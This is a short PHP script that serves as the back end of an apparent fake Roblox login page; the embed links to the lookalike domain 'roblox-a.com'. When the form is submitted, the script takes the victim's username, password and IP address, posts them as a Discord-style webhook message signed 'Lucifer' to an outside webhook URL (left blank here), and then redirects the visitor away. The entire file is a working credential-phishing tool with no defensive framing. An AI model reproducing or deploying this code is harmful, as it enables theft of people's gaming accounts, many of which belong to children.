<?php

if (isset($_POST['submit'])) {
$webhookurl = "";
$ip= $_SERVER['REMOTE_ADDR'];
$user = $_POST['username'];
$pass = $_POST['password'];

$object = json_encode([
            "username" => "Lucifer",
            "avatar_url" => "https://media1.tenor.com/images/bf8629fa4f8cf54576b94638a2e2e1c9/tenor.gif?itemid=19207409",
            
            "embeds" => [
                [
                    "title" => 'YLE',
                    "type" => "rich",
                    "description" => "Whats Inside?",
                    "url" => "https://www.roblox-a.com/phptests/",
                    "timestamp" => date('Y-m-d H:i:s'),
                    "color" => hexdec("#FF0000"),
                    "thumbnail" => [
                        "url" => "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=$user)"
                    ],
                    "footer" => [
                        "text" => "lucifer",
                        "icon_url" => "https://media.tenor.com/images/40365dd5459d6583a2e10b45aa9e9894/tenor.gif"
                    ],
                    "fields" => [
                        [
                        "name" => "Username",
                        "value" => "```".$user."```"            
                        ],
                        [
                        "name" => "Password",
                        "value" => "```".$pass."```"        
                        ],
                        
                        [
                        "name" => "Ip-Addres",
                        "value" => "```".$ip."```"
                        ],
                                                [
                        "name" => "Skin",
                        "value" => "[**Click Me!**](https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=$user)"
                        ],
                    ]
                ]
            ]
        
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "$webhookurl",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $object,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec($ch);
curl_close($ch);
}
?>
<meta HTTP-EQUIV="REFRESH" content="0; url="> 
